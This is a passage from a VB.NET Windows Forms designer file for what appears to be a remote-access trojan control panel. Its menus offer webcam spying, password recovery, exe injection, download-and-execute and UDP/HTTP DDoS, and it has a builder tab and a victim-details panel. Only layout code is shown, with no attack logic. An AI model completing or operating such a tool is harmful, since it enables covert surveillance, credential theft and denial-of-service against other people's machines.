        Me.Flags.Images.SetKeyName(188, "ru.png")
        Me.Flags.Images.SetKeyName(189, "rw.png")
        Me.Flags.Images.SetKeyName(190, "sa.png")
        Me.Flags.Images.SetKeyName(191, "sb.png")
        Me.Flags.Images.SetKeyName(192, "sc.png")
        Me.Flags.Images.SetKeyName(193, "scotland.png")
        Me.Flags.Images.SetKeyName(194, "sd.png")
        Me.Flags.Images.SetKeyName(195, "se.png")
        Me.Flags.Images.SetKeyName(196, "sg.png")
        Me.Flags.Images.SetKeyName(197, "sh.png")
        Me.Flags.Images.SetKeyName(198, "si.png")
        Me.Flags.Images.SetKeyName(199, "sj.png")
        Me.Flags.Images.SetKeyName(200, "sk.png")
        Me.Flags.Images.SetKeyName(201, "sl.png")
        Me.Flags.Images.SetKeyName(202, "sm.png")
        Me.Flags.Images.SetKeyName(203, "sn.png")
        Me.Flags.Images.SetKeyName(204, "so.png")
        Me.Flags.Images.SetKeyName(205, "sr.png")
        Me.Flags.Images.SetKeyName(206, "st.png")
        Me.Flags.Images.SetKeyName(207, "sv.png")
        Me.Flags.Images.SetKeyName(208, "sy.png")
        Me.Flags.Images.SetKeyName(209, "sz.png")
        Me.Flags.Images.SetKeyName(210, "tc.png")
        Me.Flags.Images.SetKeyName(211, "td.png")
        Me.Flags.Images.SetKeyName(212, "tf.png")
        Me.Flags.Images.SetKeyName(213, "tg.png")
        Me.Flags.Images.SetKeyName(214, "th.png")
        Me.Flags.Images.SetKeyName(215, "tj.png")
        Me.Flags.Images.SetKeyName(216, "tk.png")
        Me.Flags.Images.SetKeyName(217, "tl.png")
        Me.Flags.Images.SetKeyName(218, "tm.png")
        Me.Flags.Images.SetKeyName(219, "tn.png")
        Me.Flags.Images.SetKeyName(220, "to.png")
        Me.Flags.Images.SetKeyName(221, "tr.png")
        Me.Flags.Images.SetKeyName(222, "tt.png")
        Me.Flags.Images.SetKeyName(223, "tv.png")
        Me.Flags.Images.SetKeyName(224, "tw.png")
        Me.Flags.Images.SetKeyName(225, "tz.png")
        Me.Flags.Images.SetKeyName(226, "ua.png")
        Me.Flags.Images.SetKeyName(227, "ug.png")
        Me.Flags.Images.SetKeyName(228, "um.png")
        Me.Flags.Images.SetKeyName(229, "us.png")
        Me.Flags.Images.SetKeyName(230, "uy.png")
        Me.Flags.Images.SetKeyName(231, "uz.png")
        Me.Flags.Images.SetKeyName(232, "va.png")
        Me.Flags.Images.SetKeyName(233, "vc.png")
        Me.Flags.Images.SetKeyName(234, "ve.png")
        Me.Flags.Images.SetKeyName(235, "vg.png")
        Me.Flags.Images.SetKeyName(236, "vi.png")
        Me.Flags.Images.SetKeyName(237, "vn.png")
        Me.Flags.Images.SetKeyName(238, "vu.png")
        Me.Flags.Images.SetKeyName(239, "wales.png")
        Me.Flags.Images.SetKeyName(240, "wf.png")
        Me.Flags.Images.SetKeyName(241, "ws.png")
        Me.Flags.Images.SetKeyName(242, "ye.png")
        Me.Flags.Images.SetKeyName(243, "yt.png")
        Me.Flags.Images.SetKeyName(244, "za.png")
        Me.Flags.Images.SetKeyName(245, "zm.png")
        Me.Flags.Images.SetKeyName(246, "zw.png")
        Me.Flags.Images.SetKeyName(247, "RD.png")
        Me.Flags.Images.SetKeyName(248, "ping.png")
        '
        'Desktops
        '
        Me.Desktops.ColorDepth = System.Windows.Forms.ColorDepth.Depth8Bit
        Me.Desktops.ImageSize = New System.Drawing.Size(256, 156)
        Me.Desktops.TransparentColor = System.Drawing.Color.Transparent
        '
        'Timer1
        '
        Me.Timer1.Enabled = True
        Me.Timer1.Interval = 1
        '
        'MenuMain
        '
        Me.MenuMain.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ServerToolStripMenuItem, Me.SurveillanceToolStripMenuItem, Me.ToolsToolStripMenuItem, Me.InjectexeToolStripMenuItem, Me.MiscToolStripMenuItem, Me.PluginsToolStripMenuItem})
        Me.MenuMain.Name = "ContextMenuStrip1"
        Me.MenuMain.Size = New System.Drawing.Size(164, 136)
        '
        'ServerToolStripMenuItem
        '
        Me.ServerToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UpdateToolStripMenuItem, Me.CloseToolStripMenuItem, Me.ToolStripMenuItem1, Me.UninstallToolStripMenuItem})
        Me.ServerToolStripMenuItem.Image = CType(resources.GetObject("ServerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ServerToolStripMenuItem.Name = "ServerToolStripMenuItem"
        Me.ServerToolStripMenuItem.Size = New System.Drawing.Size(163, 22)
        Me.ServerToolStripMenuItem.Text = "Client"
        '
        'UpdateToolStripMenuItem
        '
        Me.UpdateToolStripMenuItem.Enabled = False
        Me.UpdateToolStripMenuItem.Image = CType(resources.GetObject("UpdateToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem"
        Me.UpdateToolStripMenuItem.Size = New System.Drawing.Size(120, 22)
        Me.UpdateToolStripMenuItem.Text = "Update"
        '
        'CloseToolStripMenuItem
        '
        Me.CloseToolStripMenuItem.Image = CType(resources.GetObject("CloseToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem"
        Me.CloseToolStripMenuItem.Size = New System.Drawing.Size(120, 22)
        Me.CloseToolStripMenuItem.Text = "Close"
        '
        'ToolStripMenuItem1
        '
        Me.ToolStripMenuItem1.Name = "ToolStripMenuItem1"
        Me.ToolStripMenuItem1.Size = New System.Drawing.Size(117, 6)
        '
        'UninstallToolStripMenuItem
        '
        Me.UninstallToolStripMenuItem.Image = CType(resources.GetObject("UninstallToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem"
        Me.UninstallToolStripMenuItem.Size = New System.Drawing.Size(120, 22)
        Me.UninstallToolStripMenuItem.Text = "Uninstall"
        '
        'SurveillanceToolStripMenuItem
        '
        Me.SurveillanceToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.WebcamToolStripMenuItem, Me.DesktopToolStripMenuItem, Me.PasswordRecoveryToolStripMenuItem, Me.ProcessManagerToolStripMenuItem, Me.ServiceManagerToolStripMenuItem})
        Me.SurveillanceToolStripMenuItem.Image = CType(resources.GetObject("SurveillanceToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SurveillanceToolStripMenuItem.Name = "SurveillanceToolStripMenuItem"
        Me.SurveillanceToolStripMenuItem.Size = New System.Drawing.Size(163, 22)
        Me.SurveillanceToolStripMenuItem.Text = "Surveillance"
        '
        'WebcamToolStripMenuItem
        '
        Me.WebcamToolStripMenuItem.Enabled = False
        Me.WebcamToolStripMenuItem.Image = CType(resources.GetObject("WebcamToolStripMenuItem.Image"), System.Drawing.Image)
        Me.WebcamToolStripMenuItem.Name = "WebcamToolStripMenuItem"
        Me.WebcamToolStripMenuItem.Size = New System.Drawing.Size(175, 22)
        Me.WebcamToolStripMenuItem.Text = "Remote Webcam"
        '
        'DesktopToolStripMenuItem
        '
        Me.DesktopToolStripMenuItem.Image = CType(resources.GetObject("DesktopToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DesktopToolStripMenuItem.Name = "DesktopToolStripMenuItem"
        Me.DesktopToolStripMenuItem.Size = New System.Drawing.Size(175, 22)
        Me.DesktopToolStripMenuItem.Text = "Remote Desktop"
        '
        'PasswordRecoveryToolStripMenuItem
        '
        Me.PasswordRecoveryToolStripMenuItem.Image = CType(resources.GetObject("PasswordRecoveryToolStripMenuItem.Image"), System.Drawing.Image)
        Me.PasswordRecoveryToolStripMenuItem.Name = "PasswordRecoveryToolStripMenuItem"
        Me.PasswordRecoveryToolStripMenuItem.Size = New System.Drawing.Size(175, 22)
        Me.PasswordRecoveryToolStripMenuItem.Text = "Password Recovery"
        '
        'ProcessManagerToolStripMenuItem
        '
        Me.ProcessManagerToolStripMenuItem.Image = CType(resources.GetObject("ProcessManagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ProcessManagerToolStripMenuItem.Name = "ProcessManagerToolStripMenuItem"
        Me.ProcessManagerToolStripMenuItem.Size = New System.Drawing.Size(175, 22)
        Me.ProcessManagerToolStripMenuItem.Text = "Process Manager"
        '
        'ServiceManagerToolStripMenuItem
        '
        Me.ServiceManagerToolStripMenuItem.Image = CType(resources.GetObject("ServiceManagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ServiceManagerToolStripMenuItem.Name = "ServiceManagerToolStripMenuItem"
        Me.ServiceManagerToolStripMenuItem.Size = New System.Drawing.Size(175, 22)
        Me.ServiceManagerToolStripMenuItem.Text = "Service Manager"
        '
        'ToolsToolStripMenuItem
        '
        Me.ToolsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.InstalledSoftwareToolStripMenuItem, Me.RemoteConsoleToolStripMenuItem, Me.RegistryManagerToolStripMenuItem, Me.FileManagerToolStripMenuItem})
        Me.ToolsToolStripMenuItem.Image = CType(resources.GetObject("ToolsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ToolsToolStripMenuItem.Name = "ToolsToolStripMenuItem"
        Me.ToolsToolStripMenuItem.Size = New System.Drawing.Size(163, 22)
        Me.ToolsToolStripMenuItem.Text = "Tools"
        '
        'InstalledSoftwareToolStripMenuItem
        '
        Me.InstalledSoftwareToolStripMenuItem.Image = CType(resources.GetObject("InstalledSoftwareToolStripMenuItem.Image"), System.Drawing.Image)
        Me.InstalledSoftwareToolStripMenuItem.Name = "InstalledSoftwareToolStripMenuItem"
        Me.InstalledSoftwareToolStripMenuItem.Size = New System.Drawing.Size(167, 22)
        Me.InstalledSoftwareToolStripMenuItem.Text = "Installed Software"
        '
        'RemoteConsoleToolStripMenuItem
        '
        Me.RemoteConsoleToolStripMenuItem.Image = CType(resources.GetObject("RemoteConsoleToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemoteConsoleToolStripMenuItem.Name = "RemoteConsoleToolStripMenuItem"
        Me.RemoteConsoleToolStripMenuItem.Size = New System.Drawing.Size(167, 22)
        Me.RemoteConsoleToolStripMenuItem.Text = "Remote Console"
        '
        'RegistryManagerToolStripMenuItem
        '
        Me.RegistryManagerToolStripMenuItem.Enabled = False
        Me.RegistryManagerToolStripMenuItem.Image = CType(resources.GetObject("RegistryManagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RegistryManagerToolStripMenuItem.Name = "RegistryManagerToolStripMenuItem"
        Me.RegistryManagerToolStripMenuItem.Size = New System.Drawing.Size(167, 22)
        Me.RegistryManagerToolStripMenuItem.Text = "Registry Manager"
        '
        'FileManagerToolStripMenuItem
        '
        Me.FileManagerToolStripMenuItem.Image = CType(resources.GetObject("FileManagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FileManagerToolStripMenuItem.Name = "FileManagerToolStripMenuItem"
        Me.FileManagerToolStripMenuItem.Size = New System.Drawing.Size(167, 22)
        Me.FileManagerToolStripMenuItem.Text = "File Manager"
        '
        'InjectexeToolStripMenuItem
        '
        Me.InjectexeToolStripMenuItem.Image = CType(resources.GetObject("InjectexeToolStripMenuItem.Image"), System.Drawing.Image)
        Me.InjectexeToolStripMenuItem.Name = "InjectexeToolStripMenuItem"
        Me.InjectexeToolStripMenuItem.Size = New System.Drawing.Size(163, 22)
        Me.InjectexeToolStripMenuItem.Text = "Inject .exe (32bit)"
        '
        'MiscToolStripMenuItem
        '
        Me.MiscToolStripMenuItem.Image = CType(resources.GetObject("MiscToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MiscToolStripMenuItem.Name = "MiscToolStripMenuItem"
        Me.MiscToolStripMenuItem.Size = New System.Drawing.Size(163, 22)
        Me.MiscToolStripMenuItem.Text = "Misc"
        '
        'PluginsToolStripMenuItem
        '
        Me.PluginsToolStripMenuItem.Enabled = False
        Me.PluginsToolStripMenuItem.Image = CType(resources.GetObject("PluginsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.PluginsToolStripMenuItem.Name = "PluginsToolStripMenuItem"
        Me.PluginsToolStripMenuItem.Size = New System.Drawing.Size(163, 22)
        Me.PluginsToolStripMenuItem.Text = "Plugins"
        '
        'tmrcons
        '
        Me.tmrcons.Enabled = True
        Me.tmrcons.Interval = 1
        '
        'ImageList1
        '
        Me.ImageList1.ImageStream = CType(resources.GetObject("ImageList1.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageList1.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageList1.Images.SetKeyName(0, "connections.png")
        Me.ImageList1.Images.SetKeyName(1, "socketinfo.png")
        Me.ImageList1.Images.SetKeyName(2, "settings.png")
        Me.ImageList1.Images.SetKeyName(3, "builder.png")
        Me.ImageList1.Images.SetKeyName(4, "TOS.png")
        Me.ImageList1.Images.SetKeyName(5, "accountinfo.png")
        Me.ImageList1.Images.SetKeyName(6, "image.png")
        Me.ImageList1.Images.SetKeyName(7, "magnifier.png")
        Me.ImageList1.Images.SetKeyName(8, "locale-alternate.png")
        Me.ImageList1.Images.SetKeyName(9, "arrow-repeat.png")
        '
        'tmrAlive
        '
        Me.tmrAlive.Enabled = True
        Me.tmrAlive.Interval = 10000
        '
        'TabPage7
        '
        Me.TabPage7.Location = New System.Drawing.Point(124, 4)
        Me.TabPage7.Name = "TabPage7"
        Me.TabPage7.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage7.Size = New System.Drawing.Size(948, 497)
        Me.TabPage7.TabIndex = 0
        Me.TabPage7.Text = "Connections"
        Me.TabPage7.UseVisualStyleBackColor = True
        '
        'TabPage10
        '
        Me.TabPage10.Location = New System.Drawing.Point(124, 4)
        Me.TabPage10.Name = "TabPage10"
        Me.TabPage10.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage10.Size = New System.Drawing.Size(948, 497)
        Me.TabPage10.TabIndex = 1
        Me.TabPage10.Text = "Socket Info"
        Me.TabPage10.UseVisualStyleBackColor = True
        '
        'TabPage11
        '
        Me.TabPage11.Location = New System.Drawing.Point(124, 4)
        Me.TabPage11.Name = "TabPage11"
        Me.TabPage11.Size = New System.Drawing.Size(948, 497)
        Me.TabPage11.TabIndex = 2
        Me.TabPage11.Text = "Settings"
        Me.TabPage11.UseVisualStyleBackColor = True
        '
        'TabPage12
        '
        Me.TabPage12.Location = New System.Drawing.Point(124, 4)
        Me.TabPage12.Name = "TabPage12"
        Me.TabPage12.Size = New System.Drawing.Size(948, 497)
        Me.TabPage12.TabIndex = 3
        Me.TabPage12.Text = "Builder"
        Me.TabPage12.UseVisualStyleBackColor = True
        '
        'TabPage13
        '
        Me.TabPage13.Location = New System.Drawing.Point(124, 4)
        Me.TabPage13.Name = "TabPage13"
        Me.TabPage13.Size = New System.Drawing.Size(948, 497)
        Me.TabPage13.TabIndex = 4
        Me.TabPage13.Text = "About & ToS"
        Me.TabPage13.UseVisualStyleBackColor = True
        '
        'TabPage14
        '
        Me.TabPage14.Location = New System.Drawing.Point(124, 4)
        Me.TabPage14.Name = "TabPage14"
        Me.TabPage14.Size = New System.Drawing.Size(948, 497)
        Me.TabPage14.TabIndex = 5
        Me.TabPage14.Text = "Account Info"
        Me.TabPage14.UseVisualStyleBackColor = True
        '
        'StatusStrip1
        '
        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripStatusLabel1, Me.sentbytes, Me.ToolStripStatusLabel2, Me.ToolStripStatusLabel4, Me.ToolStripStatusLabel5, Me.ToolStripStatusLabel3})
        Me.StatusStrip1.Location = New System.Drawing.Point(0, 507)
        Me.StatusStrip1.Name = "StatusStrip1"
        Me.StatusStrip1.Size = New System.Drawing.Size(1230, 22)
        Me.StatusStrip1.TabIndex = 13
        Me.StatusStrip1.Text = "StatusStrip1"
        '
        'ToolStripStatusLabel1
        '
        Me.ToolStripStatusLabel1.Image = CType(resources.GetObject("ToolStripStatusLabel1.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1"
        Me.ToolStripStatusLabel1.Size = New System.Drawing.Size(121, 17)
        Me.ToolStripStatusLabel1.Text = "Connected clients:"
        '
        'sentbytes
        '
        Me.sentbytes.Name = "sentbytes"
        Me.sentbytes.Size = New System.Drawing.Size(13, 17)
        Me.sentbytes.Text = "0"
        '
        'ToolStripStatusLabel2
        '
        Me.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2"
        Me.ToolStripStatusLabel2.Size = New System.Drawing.Size(945, 17)
        Me.ToolStripStatusLabel2.Spring = True
        '
        'ToolStripStatusLabel4
        '
        Me.ToolStripStatusLabel4.Name = "ToolStripStatusLabel4"
        Me.ToolStripStatusLabel4.Size = New System.Drawing.Size(120, 17)
        Me.ToolStripStatusLabel4.Text = "Listening on: 777, 778"
        '
        'ToolStripStatusLabel5
        '
        Me.ToolStripStatusLabel5.Font = New System.Drawing.Font("Segoe UI", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ToolStripStatusLabel5.ForeColor = System.Drawing.Color.Red
        Me.ToolStripStatusLabel5.Image = CType(resources.GetObject("ToolStripStatusLabel5.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel5.Name = "ToolStripStatusLabel5"
        Me.ToolStripStatusLabel5.Size = New System.Drawing.Size(16, 17)
        '
        'ToolStripStatusLabel3
        '
        Me.ToolStripStatusLabel3.Image = CType(resources.GetObject("ToolStripStatusLabel3.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel3.Name = "ToolStripStatusLabel3"
        Me.ToolStripStatusLabel3.Size = New System.Drawing.Size(16, 17)
        Me.ToolStripStatusLabel3.Visible = False
        '
        'tmrDataflow
        '
        Me.tmrDataflow.Enabled = True
        Me.tmrDataflow.Interval = 1
        '
        'Updates
        '
        Me.Updates.ImageStream = CType(resources.GetObject("Updates.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.Updates.TransparentColor = System.Drawing.Color.Transparent
        Me.Updates.Images.SetKeyName(0, "add")
        Me.Updates.Images.SetKeyName(1, "fix")
        Me.Updates.Images.SetKeyName(2, "remove")
        Me.Updates.Images.SetKeyName(3, "update")
        '
        'MenuOnConnect
        '
        Me.MenuOnConnect.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.DeleteCommandToolStripMenuItem, Me.ToolStripMenuItem2, Me.DeleteAllCommandsToolStripMenuItem})
        Me.MenuOnConnect.Name = "MenuOnConnect"
        Me.MenuOnConnect.Size = New System.Drawing.Size(188, 54)
        '
        'DeleteCommandToolStripMenuItem
        '
        Me.DeleteCommandToolStripMenuItem.Image = CType(resources.GetObject("DeleteCommandToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DeleteCommandToolStripMenuItem.Name = "DeleteCommandToolStripMenuItem"
        Me.DeleteCommandToolStripMenuItem.Size = New System.Drawing.Size(187, 22)
        Me.DeleteCommandToolStripMenuItem.Text = "Delete Commands"
        '
        'ToolStripMenuItem2
        '
        Me.ToolStripMenuItem2.Name = "ToolStripMenuItem2"
        Me.ToolStripMenuItem2.Size = New System.Drawing.Size(184, 6)
        '
        'DeleteAllCommandsToolStripMenuItem
        '
        Me.DeleteAllCommandsToolStripMenuItem.Image = CType(resources.GetObject("DeleteAllCommandsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DeleteAllCommandsToolStripMenuItem.Name = "DeleteAllCommandsToolStripMenuItem"
        Me.DeleteAllCommandsToolStripMenuItem.Size = New System.Drawing.Size(187, 22)
        Me.DeleteAllCommandsToolStripMenuItem.Text = "Delete all Commands"
        '
        'MultiMain
        '
        Me.MultiMain.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ClientsToolStripMenuItem, Me.DLExecuteToolStripMenuItem, Me.DDoSToolStripMenuItem})
        Me.MultiMain.Name = "MultiMain"
        Me.MultiMain.Size = New System.Drawing.Size(145, 70)
        '
        'ClientsToolStripMenuItem
        '
        Me.ClientsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UpdateToolStripMenuItem1, Me.CloseToolStripMenuItem1, Me.ToolStripMenuItem3, Me.UninstallToolStripMenuItem1})
        Me.ClientsToolStripMenuItem.Image = CType(resources.GetObject("ClientsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ClientsToolStripMenuItem.Name = "ClientsToolStripMenuItem"
        Me.ClientsToolStripMenuItem.Size = New System.Drawing.Size(144, 22)
        Me.ClientsToolStripMenuItem.Text = "Clients"
        '
        'UpdateToolStripMenuItem1
        '
        Me.UpdateToolStripMenuItem1.Enabled = False
        Me.UpdateToolStripMenuItem1.Image = CType(resources.GetObject("UpdateToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.UpdateToolStripMenuItem1.Name = "UpdateToolStripMenuItem1"
        Me.UpdateToolStripMenuItem1.Size = New System.Drawing.Size(120, 22)
        Me.UpdateToolStripMenuItem1.Text = "Update"
        '
        'CloseToolStripMenuItem1
        '
        Me.CloseToolStripMenuItem1.Image = CType(resources.GetObject("CloseToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.CloseToolStripMenuItem1.Name = "CloseToolStripMenuItem1"
        Me.CloseToolStripMenuItem1.Size = New System.Drawing.Size(120, 22)
        Me.CloseToolStripMenuItem1.Text = "Close"
        '
        'ToolStripMenuItem3
        '
        Me.ToolStripMenuItem3.Name = "ToolStripMenuItem3"
        Me.ToolStripMenuItem3.Size = New System.Drawing.Size(117, 6)
        '
        'UninstallToolStripMenuItem1
        '
        Me.UninstallToolStripMenuItem1.Image = CType(resources.GetObject("UninstallToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.UninstallToolStripMenuItem1.Name = "UninstallToolStripMenuItem1"
        Me.UninstallToolStripMenuItem1.Size = New System.Drawing.Size(120, 22)
        Me.UninstallToolStripMenuItem1.Text = "Uninstall"
        '
        'DLExecuteToolStripMenuItem
        '
        Me.DLExecuteToolStripMenuItem.Image = CType(resources.GetObject("DLExecuteToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DLExecuteToolStripMenuItem.Name = "DLExecuteToolStripMenuItem"
        Me.DLExecuteToolStripMenuItem.Size = New System.Drawing.Size(144, 22)
        Me.DLExecuteToolStripMenuItem.Text = "DL && Execute"
        '
        'DDoSToolStripMenuItem
        '
        Me.DDoSToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UDPToolStripMenuItem, Me.HTTPToolStripMenuItem})
        Me.DDoSToolStripMenuItem.Image = CType(resources.GetObject("DDoSToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DDoSToolStripMenuItem.Name = "DDoSToolStripMenuItem"
        Me.DDoSToolStripMenuItem.Size = New System.Drawing.Size(144, 22)
        Me.DDoSToolStripMenuItem.Text = "DDoS"
        '
        'UDPToolStripMenuItem
        '
        Me.UDPToolStripMenuItem.Image = CType(resources.GetObject("UDPToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UDPToolStripMenuItem.Name = "UDPToolStripMenuItem"
        Me.UDPToolStripMenuItem.Size = New System.Drawing.Size(104, 22)
        Me.UDPToolStripMenuItem.Text = "UDP"
        '
        'HTTPToolStripMenuItem
        '
        Me.HTTPToolStripMenuItem.Image = CType(resources.GetObject("HTTPToolStripMenuItem.Image"), System.Drawing.Image)
        Me.HTTPToolStripMenuItem.Name = "HTTPToolStripMenuItem"
        Me.HTTPToolStripMenuItem.Size = New System.Drawing.Size(104, 22)
        Me.HTTPToolStripMenuItem.Text = "HTTP"
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.StopDDoSToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(131, 26)
        '
        'StopDDoSToolStripMenuItem
        '
        Me.StopDDoSToolStripMenuItem.Image = CType(resources.GetObject("StopDDoSToolStripMenuItem.Image"), System.Drawing.Image)
        Me.StopDDoSToolStripMenuItem.Name = "StopDDoSToolStripMenuItem"
        Me.StopDDoSToolStripMenuItem.Size = New System.Drawing.Size(130, 22)
        Me.StopDDoSToolStripMenuItem.Text = "Stop DDoS"
        '
        'ContextMenuStrip2
        '
        Me.ContextMenuStrip2.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RemovePortToolStripMenuItem})
        Me.ContextMenuStrip2.Name = "ContextMenuStrip2"
        Me.ContextMenuStrip2.Size = New System.Drawing.Size(143, 26)
        '
        'RemovePortToolStripMenuItem
        '
        Me.RemovePortToolStripMenuItem.Image = CType(resources.GetObject("RemovePortToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemovePortToolStripMenuItem.Name = "RemovePortToolStripMenuItem"
        Me.RemovePortToolStripMenuItem.Size = New System.Drawing.Size(142, 22)
        Me.RemovePortToolStripMenuItem.Text = "Remove Port"
        '
        'TabControlClass1
        '
        Me.TabControlClass1.Alignment = System.Windows.Forms.TabAlignment.Left
        Me.TabControlClass1.Controls.Add(Me.TabPage16)
        Me.TabControlClass1.Controls.Add(Me.TabPage1)
        Me.TabControlClass1.Controls.Add(Me.TabPage15)
        Me.TabControlClass1.Controls.Add(Me.TabPage6)
        Me.TabControlClass1.Controls.Add(Me.TabPage8)
        Me.TabControlClass1.Controls.Add(Me.TabPage9)
        Me.TabControlClass1.Controls.Add(Me.TabPage2)
        Me.TabControlClass1.Controls.Add(Me.TabPage3)
        Me.TabControlClass1.Controls.Add(Me.TabPage5)
        Me.TabControlClass1.Controls.Add(Me.TabPage4)
        Me.TabControlClass1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TabControlClass1.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed
        Me.TabControlClass1.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.TabControlClass1.ImageList = Me.ImageList1
        Me.TabControlClass1.ItemSize = New System.Drawing.Size(25, 120)
        Me.TabControlClass1.Location = New System.Drawing.Point(0, 0)
        Me.TabControlClass1.Multiline = True
        Me.TabControlClass1.Name = "TabControlClass1"
        Me.TabControlClass1.SelectedIndex = 0
        Me.TabControlClass1.ShowOuterBorders = False
        Me.TabControlClass1.Size = New System.Drawing.Size(1230, 529)
        Me.TabControlClass1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
        Me.TabControlClass1.SquareColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.TabControlClass1.TabIndex = 12
        '
        'TabPage16
        '
        Me.TabPage16.BackColor = System.Drawing.Color.White
        Me.TabPage16.Controls.Add(Me.lstUpdates)
        Me.TabPage16.Controls.Add(Me.txtMOTD)
        Me.TabPage16.ImageIndex = 9
        Me.TabPage16.Location = New System.Drawing.Point(124, 4)
        Me.TabPage16.Name = "TabPage16"
        Me.TabPage16.Size = New System.Drawing.Size(1102, 521)
        Me.TabPage16.TabIndex = 10
        Me.TabPage16.Text = "Changelog"
        '
        'lstUpdates
        '
        Me.lstUpdates.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader8, Me.ColumnHeader15, Me.ColumnHeader16})
        Me.lstUpdates.FullRowSelect = True
        Me.lstUpdates.Location = New System.Drawing.Point(700, 8)
        Me.lstUpdates.Name = "lstUpdates"
        Me.lstUpdates.Size = New System.Drawing.Size(394, 492)
        Me.lstUpdates.SmallImageList = Me.Updates
        Me.lstUpdates.TabIndex = 21
        Me.lstUpdates.UseCompatibleStateImageBehavior = False
        Me.lstUpdates.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader8
        '
        Me.ColumnHeader8.Text = "Action"
        Me.ColumnHeader8.Width = 63
        '
        'ColumnHeader15
        '
        Me.ColumnHeader15.Text = "Version"
        Me.ColumnHeader15.Width = 57
        '
        'ColumnHeader16
        '
        Me.ColumnHeader16.Text = "Info"
        Me.ColumnHeader16.Width = 240
        '
        'txtMOTD
        '
        Me.txtMOTD.Location = New System.Drawing.Point(3, 8)
        Me.txtMOTD.Multiline = True
        Me.txtMOTD.Name = "txtMOTD"
        Me.txtMOTD.ReadOnly = True
        Me.txtMOTD.Size = New System.Drawing.Size(679, 492)
        Me.txtMOTD.TabIndex = 20
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.White
        Me.TabPage1.Controls.Add(Me.GroupBox5)
        Me.TabPage1.Controls.Add(Me.lstConnections)
        Me.TabPage1.Cursor = System.Windows.Forms.Cursors.Default
        Me.TabPage1.ImageIndex = 0
        Me.TabPage1.Location = New System.Drawing.Point(124, 4)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(1102, 521)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Connections"
        '
        'GroupBox5
        '
        Me.GroupBox5.Controls.Add(Me.lblcMonitor)
        Me.GroupBox5.Controls.Add(Me.lblcCountry)
        Me.GroupBox5.Controls.Add(Me.lblcAV)
        Me.GroupBox5.Controls.Add(Me.lblcLocation)
        Me.GroupBox5.Controls.Add(Me.lblcVersion)
        Me.GroupBox5.Controls.Add(Me.lblcOS)
        Me.GroupBox5.Controls.Add(Me.lblcPCName)
        Me.GroupBox5.Controls.Add(Me.lblcUser)
        Me.GroupBox5.Controls.Add(Me.lblcIP)
        Me.GroupBox5.Controls.Add(Me.pboxDesktop)
        Me.GroupBox5.Location = New System.Drawing.Point(3, 322)
        Me.GroupBox5.Name = "GroupBox5"
        Me.GroupBox5.Size = New System.Drawing.Size(1091, 178)
        Me.GroupBox5.TabIndex = 16
        Me.GroupBox5.TabStop = False
        Me.GroupBox5.Text = "Client Information"
        '
        'lblcMonitor
        '
